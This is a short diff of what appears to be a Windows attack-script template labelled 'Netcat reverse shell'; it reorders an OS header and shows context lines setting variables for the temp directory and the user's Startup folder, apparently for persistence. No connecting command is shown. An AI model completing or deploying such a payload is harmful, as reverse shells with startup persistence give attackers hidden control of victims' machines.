@@ -1,5 +1,7 @@
-::OS Windows
 ::REM Netcat reverse shell
+
+::OS Windows
+
 ::TERM
 $temp = $env:TEMP
 $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\StartUp"
